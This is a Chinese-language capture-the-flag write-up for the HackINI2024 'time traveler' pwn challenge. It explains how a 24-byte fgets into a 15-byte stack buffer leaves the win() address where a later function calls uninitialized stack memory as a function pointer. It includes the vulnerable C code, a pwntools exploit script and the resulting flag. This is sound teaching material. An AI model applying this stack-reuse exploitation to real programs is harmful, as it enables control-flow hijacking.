# HackINI2024 time traveler

## 题目简述

题目包含两个连续调用的函数。`timeTravel()` 向 15 字节栈缓冲区读取最多 23 个字符，能够覆盖相邻栈内容；随后 `check()` 把一个未初始化栈数组的前 8 字节直接当作函数地址调用。由于两个函数复用了同一片栈空间，可以让前一个函数留下的 `win()` 地址成为后一个函数的间接调用目标。

## 解题过程

核心代码为：

```c
void check() {
    char future[15];
    ((void (*)())(uintptr_t)(*(unsigned long *)future))();
}

void timeTravel() {
    char agent[15];
    unsigned long month = 12;
    unsigned long year = 2023;
    fgets(agent, 24, stdin);
}
```

程序为 64 位、无 PIE 且无栈保护。附件二进制的布局中，输入 16 字节填充后写入的内容会留在 `check()` 随后用作 `future` 起点的位置。因此 payload 为：

```python
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
io = process(elf.path)

payload = b"A" * 16 + p64(elf.sym.win)
io.sendlineafter(
    b"I heard that you can control the future.Prove it to me !\n>",
    payload,
)
print(io.recvall().decode())
```

`fgets(agent, 24, ...)` 最多保存 23 个输入字节并补一个 NUL。`win()` 地址的高位本来就是零，因此 payload 的有效低位字节加上终止 NUL 仍能形成正确指针。`timeTravel()` 返回后，`check()` 未初始化 `future`，直接取出残留的地址并跳转到 `win()`，输出：

```text
shellmates{I_HoPE_YOu_UNDErStanD_N0w_H0W_th3_$T4cK_WOrK$!}
```

仓库中的官方 README 仍是占位模板，但其 `solve.py` 与实际二进制、flag 文件一致。

## 方法总结

本题利用的是越界写与未初始化栈内存的组合，而不是直接覆盖当前函数的返回地址。函数返回后，栈内容通常不会被清零；后续栈帧复用同一区域时，残留数据就可能被当作有效指针。偏移 16 依赖具体二进制布局，复现时应以反汇编或调试结果确认。
